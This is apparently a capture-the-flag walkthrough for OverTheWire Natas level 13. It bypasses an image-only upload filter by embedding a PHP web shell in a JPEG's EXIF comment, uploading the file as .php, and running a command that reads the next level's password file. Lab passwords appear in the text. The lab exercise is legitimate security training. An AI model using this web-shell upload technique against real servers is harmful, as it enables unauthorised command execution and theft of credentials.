# Natas Level 13

> Username: natas13

> Password: g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

> URL: http://natas13.natas.labs.overthewire.org

## Solution

Entering the URL, we found something like the previous level, but now there is some checks: 
`For security reasons, we now only accept image files!`

Let's view the source code to see the how the filter works.
We found all the code is like on the previous level but there is one statement added.

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```

The code verifies the metadata of the file being uploaded; it must match the metadata associated with images.

So our goal is to create a small JPEG image less than 1Kb. Then we have to add our payload inside the image itself.

First let's create a very small image (100 Byte Image).

```shell
sudo apt update -y && sudo apt install imagemagick -y
```

```shell
convert -size 1x1 xc:none image.jpeg
```

Then we add our payload using `ExifTool`.

```shell
exiftool -Comment='<?php echo "Output: "; system($_GET["cmd"]); ?>' image.jpeg
```

Then checks the metadata.

```shell
exiftool image.jpeg
```

```text
ExifTool Version Number         : 13.55
File Name                       : image.jpeg
Directory                       : .
File Size                       : 211 bytes
File Modification Date/Time     : 2026:11:01 23:27:37+00:00
File Access Date/Time           : 2026:11:01 23:27:37+00:00
File Inode Change Date/Time     : 2026:11:01 23:27:37+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : <?php echo "Output: "; system($_GET["cmd"]); ?>
Image Width                     : 1
Image Height                    : 1
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 1
Image Size                      : 1x1
Megapixels                      : 0.000001
```

Now like the previous level we can upload the file and intercept it using `Burp` to change the extension of the random path, and finally access the path and run command to read the password for the next level.

```url
http://natas13.natas.labs.overthewire.org/upload/fx9dh6sr3k.php?cmd=cat%20/etc/natas_webpass/natas14
```

```text
Output: A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```

```text
A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```

